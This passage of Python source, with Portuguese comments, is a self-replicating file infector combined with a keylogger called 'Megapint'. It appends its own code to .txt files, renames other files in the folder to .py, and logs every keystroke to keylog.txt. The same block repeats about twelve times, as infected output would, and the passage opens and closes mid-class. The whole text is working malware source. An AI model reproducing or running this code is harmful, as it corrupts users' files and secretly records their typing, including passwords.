    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
